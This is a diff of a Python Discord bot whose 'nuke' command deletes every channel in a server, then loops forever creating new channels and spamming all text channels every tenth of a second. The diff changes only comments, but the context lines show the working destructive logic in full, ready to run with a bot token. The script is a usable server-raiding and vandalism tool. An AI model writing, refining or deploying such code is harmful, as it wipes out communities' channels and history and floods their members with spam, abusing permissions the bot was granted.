@@ -28,13 +28,13 @@ async def nuke(ctx):
     except discord.Forbidden:
         pass
 
-    # --- Phase 1: Delete all existing channels concurrently ---
+    # Delete all existing channels concurrently 
     deletion_tasks = [channel.delete() for channel in ctx.guild.channels]
     await asyncio.gather(*deletion_tasks, return_exceptions=True)
     print(f'Attempted to delete all existing channels.')
     await asyncio.sleep(1) # Small pause for API consistency
 
-    # --- Phase 2: Start two concurrent main tasks ---
+    # Start two concurrent main tasks
     # 1. Create channels repeatedly (create_channels_task)
     # 2. Spam all available channels repeatedly (spam_existing_channels_task)
 
@@ -45,7 +45,7 @@ async def nuke(ctx):
     )
     print("Nuke operation finished.") # This is only reached if a task breaks the loop
 
-# --- Asynchronous function to continuously create channels ---
+# Asynchronous function to continuously create channels
 async def create_channels_task(guild):
     while True:
         try:
@@ -58,7 +58,7 @@ async def create_channels_task(guild):
         except Exception as e:
             print(f'Error in create task: {e}')
 
-# --- Asynchronous function to continuously spam all *existing* channels ---
+# Asynchronous function to continuously spam all *existing* channels 
 async def spam_existing_channels_task(guild):
     # Use an alternating list of messages to ensure unique content if needed
     messages = [f"{SPAM_MESSAGE_CONTENT} (Alt 1)", f"{SPAM_MESSAGE_CONTENT} (Alt 2)"]
@@ -68,7 +68,7 @@ async def spam_existing_channels_task(guild):
         # Get a fresh list of all current text channels in the guild
         current_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
 
-        # Create a list of message sending tasks for ALL current channels
+        # Create a list of message sending tasks for all current channels
         send_tasks = []
         for channel in current_channels:
             content = next(message_cycle)
@@ -79,7 +79,7 @@ async def spam_existing_channels_task(guild):
             await asyncio.gather(*send_tasks, return_exceptions=True)
             print(f'Sent messages to {len(send_tasks)} channels concurrently.')
 
-        # A minimal sleep is required here for the loop to yield control and prevent CPU overuse
+        # A minimal sleep is required here for the loop to yield control and prevent CPU over use
         await asyncio.sleep(0.1)
 
 bot.run('enter your token')
